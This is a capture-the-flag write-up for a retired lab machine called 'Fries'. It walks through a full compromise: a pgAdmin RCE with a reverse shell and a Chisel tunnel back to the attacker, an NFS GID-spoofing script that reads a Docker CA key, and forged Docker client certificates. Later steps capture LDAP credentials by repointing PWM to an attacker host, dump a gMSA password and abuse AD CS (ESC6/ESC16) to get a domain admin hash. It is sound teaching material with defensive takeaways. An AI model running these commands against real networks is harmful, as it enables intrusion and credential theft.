# Fries

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=flat-square) ![Released](https://img.shields.io/badge/Released-2025--11--22-informational?style=flat-square)

| | |
|---|---|
| **OS** | Windows |
| **Difficulty** | Hard |
| **Release** | November 22, 2025 |
| **Rating** | 4.6 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

A long chain across a Linux Docker host and a Windows DC. An authenticated pgAdmin RCE gives a shell inside the Postgres container; from there an NFS export is reachable, and NFS credential (GID) spoofing reads the Docker TLS CA key. Signing a client certificate with `CN=sysadm` passes the Docker authz-broker, which exposes the PWM container's configuration. Cracking the PWM config password allows re-importing a modified config that points PWM's LDAP server at the attacker, capturing `svc_infra`'s password in cleartext. `svc_infra` can read a gMSA's managed password, and that gMSA holds **ManageCA** rights — enabling **ESC6 + ESC16** to mint an Administrator certificate.

---

## Credentials Collected

| Account | Password/Hash | Source |
|---------|---------------|--------|
| `d.cooper@fries.htb` | `D4LE11maan!!` | Initial creds |
| `svc_infra` | `m6tneOMAh5p0wQ0d` | PWM LDAP capture |
| `gMSA_CA_prod$` | `02dc1e938b2004f0c8145b499ee73f41` (NT) | gMSA dump |
| `Administrator` | `a773cb05d79273299a684a23ede56748` (NT) | Certipy ESC6/16 |

## Phase 1: Initial Setup

### Hosts configuration

```bash
echo "<TARGET_IP> fries.htb dc01.fries.htb pwm.fries.htb db-mgmt05.fries.htb code.fries.htb" >> /etc/hosts
```

### Initial access — pgAdmin RCE

Using the Metasploit pgAdmin authenticated RCE to get a shell in the Postgres container:

```bash
msfconsole -q -x "
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS db-mgmt05.fries.htb
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS <DB_PASSWORD_FROM_GIT>
set DB_NAME ps_db
set LHOST <YOUR_IP>
set LPORT 4444
exploit
"
```

---

## Phase 2: Container → NFS Exploitation

### Set up a Chisel tunnel

On the attacker:

```bash
./chisel server -p 8080 --reverse
```

On the target (as `svc@web`):

```bash
./chisel client <ATTACKER_IP>:8080 R:2049:172.18.0.1:2049 R:2376:127.0.0.1:2376 &
```

### NFS analysis and certificate extraction

```bash
pip install git+https://github.com/hvs-consulting/nfs-security-tooling.git --break-system-packages

nfs_analyze 127.0.0.1 /srv/web.fries.htb
```

### Read the Docker CA certificates via NFS

The certs directory has GID `59605603` (infra managers). NFS `AUTH_SYS` lets the client simply assert that GID:

```python
from nfs_analyze.nfs_analyze import *

class Options:
    timeout = 3000
    charset = 'utf-8'

import nfs_analyze.nfs_analyze as nfs_mod
nfs_mod.options = Options()

nfs4_client = nfs4client.NFS4Client(host='127.0.0.1', port=2049, secure=True,
                                    minorversion=0, timeout=3000)

root_fh = bytearray.fromhex('0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000')

# Use the infra managers GID to access certs
cred = auth_sys.init_cred(0, 59605603, b"test", 44, [59605603])
nfs4_client.set_cred(cred)

# Navigate to ca-key.pem
srv_fh   = nfs4_lookup(nfs4_client, root_fh,  b"srv")
web_fh   = nfs4_lookup(nfs4_client, srv_fh,   b"web.fries.htb")
certs_fh = nfs4_lookup(nfs4_client, web_fh,   b"certs")
cakey_fh = nfs4_lookup(nfs4_client, certs_fh, b"ca-key.pem")

result = nfs4_read_entire_file(nfs4_client, cakey_fh, cred)
print(result.data.decode())
```

Save the resulting `ca-key.pem`. The matching `ca.pem` is readable directly from `svc@web` at `/etc/docker/certs/ca.pem`.

---

## Phase 3: Docker TLS Auth Bypass

### Generate a client certificate as `sysadm`

The Docker authz-broker uses the certificate's CN to determine the user's permissions:

```bash
openssl genrsa -out client-key.pem 4096
openssl req -new -key client-key.pem -out client.csr -subj "/CN=sysadm"
openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial -out client-cert.pem -days 365
```

### Test Docker access

```bash
docker --tlsverify --tlscacert=ca.pem --tlscert=client-cert.pem \
  --tlskey=client-key.pem -H tcp://127.0.0.1:2376 ps
```

```
CONTAINER ID   IMAGE                   COMMAND                  CREATED        STATUS          PORTS
f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        7 months ago   Up 55 minutes   0.0.0.0:8443->8443/tcp
cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         7 months ago   Up 54 minutes   443/tcp, 127.0.0.1:5050->80/tcp
...
```

### Extract the PWM configuration

```bash
docker --tlsverify --tlscacert=ca.pem --tlscert=client-cert.pem \
  --tlskey=client-key.pem -H tcp://127.0.0.1:2376 cp pwm:/config/PwmConfiguration.xml .
```

---

## Phase 4: LDAP Credential Capture

### Crack the PWM config password

The PWM configuration is password-protected:

```bash
grep -i "configPasswordHash" PwmConfiguration.xml
# Hash: $2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG

hashcat -m 3200 pwm_hash.txt /usr/share/wordlists/rockyou.txt
# Result: rockon!
```

### Download the configuration from the PWM web UI

1. Browse to `https://pwm.fries.htb/pwm/private/config/manager`
2. Enter the password `rockon!`
3. Click **Download Configuration**

### Modify the LDAP URL

```bash
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<ATTACKER_IP>:389|g' PwmConfiguration.xml
grep -i "serverUrls" -A2 PwmConfiguration.xml
```

Note the change from `ldaps` to plain `ldap` — that's what makes the captured bind credential cleartext rather than encrypted.

### Start Responder

```bash
sudo responder -I tun0 -v
```

### Upload the modified configuration

In the PWM Configuration Manager, choose **Import Configuration**, upload the modified `PwmConfiguration.xml`, and enter `rockon!`.

### Trigger the LDAP connection

Browse to `https://pwm.fries.htb/pwm/` and attempt a login with any credentials. Responder captures:

```
[LDAP] Cleartext Client   : <TARGET_IP>
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
```

---

## Phase 5: gMSA Password Dump

```bash
bloodyAD --host <TARGET_IP> -d fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' get search \
    --filter '(objectClass=msDS-GroupManagedServiceAccount)' \
    --attr sAMAccountName,msDS-ManagedPassword
```

```
distinguishedName: CN=gMSA_CA_prod,CN=Managed Service Accounts,DC=fries,DC=htb
msDS-ManagedPassword.NT: 02dc1e938b2004f0c8145b499ee73f41
sAMAccountName: gMSA_CA_prod$
```

```bash
evil-winrm -i <TARGET_IP> -u 'gMSA_CA_prod$' -H '02dc1e938b2004f0c8145b499ee73f41'
```

---

## Phase 6: ESC6 + ESC16 Configuration

The `gMSA_CA_prod$` account has **ManageCA** rights on the CA, which is enough to reconfigure the CA itself.

### Enable ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"
$current = 1114446
$new = $current -bor 0x00040000
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new)
```

### Enable ESC16 (disable SID extension validation)

```powershell
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")
```

### Restart the CA service

```powershell
Restart-Service certsvc -Force
```

---

## Phase 7: Administrator Certificate Attack

### Get the Administrator SID

```bash
bloodyAD --host <TARGET_IP> -d fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' get search \
    --filter '(sAMAccountName=Administrator)' --attr objectSid
# objectSid: S-1-5-21-858338346-3861030516-3975240472-500
```

### Sync time

```bash
sudo ntpdate <TARGET_IP>
```

### Request the Administrator certificate

```bash
certipy req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' \
    -target <TARGET_IP> \
    -dc-ip <TARGET_IP> \
    -ca 'fries-DC01-CA' \
    -template 'User' \
    -upn 'administrator@fries.htb' \
    -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
```

### Authenticate and get the NT hash

```bash
certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
# [*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

---

## Phase 8: Flags

```bash
evil-winrm -i <TARGET_IP> -u 'administrator' -H 'a773cb05d79273299a684a23ede56748'
```

```powershell
type C:\Users\Administrator\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## Tools Required

| Tool | Purpose |
|------|---------|
| `chisel` | Port forwarding |
| `nfs-security-tooling` | NFS credential spoofing |
| `openssl` | Certificate generation |
| `docker` | Container interaction |
| `hashcat` | PWM config password cracking |
| `responder` | LDAP credential capture |
| `bloodyAD` | gMSA password dump and AD queries |
| `evil-winrm` | WinRM access |
| `certipy` | AD CS attacks (ESC6/ESC16) |

Approximate timings: pgAdmin RCE 5 min, NFS exploitation 10 min, Docker TLS bypass 5 min, LDAP capture 10 min, gMSA dump 2 min, ESC6/16 configuration 5 min, certificate attack 5 min — roughly 45 minutes end to end.

## Key Takeaways

1. **NFS misconfiguration** — with `AUTH_SYS`, the client asserts its own UID/GID. Spoofing a GID is enough to read a restricted directory, which is why NFS exports should use Kerberos or be restricted at the export level.
2. **Docker authz-broker** — the CN in the client certificate determines permissions. Possession of the CA key is therefore equivalent to being any Docker user.
3. **PWM config manipulation** — download the config from the web UI, repoint the LDAP URL at yourself, re-import, and the application hands you its bind credentials. Downgrading `ldaps` to `ldap` is what makes them cleartext.
4. **gMSA abuse** — `svc_infra` was permitted to read the gMSA managed password, which is a single ACL away from the CA.
5. **ESC6 + ESC16 combo** — ManageCA rights allow enabling `EDITF_ATTRIBUTESUBJECTALTNAME2` and disabling SID extension validation, which together re-open an attack the SID extension was introduced to close.
6. **Certificate-based auth** — request a certificate with the admin UPN and SID to impersonate Administrator without ever touching their password.

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
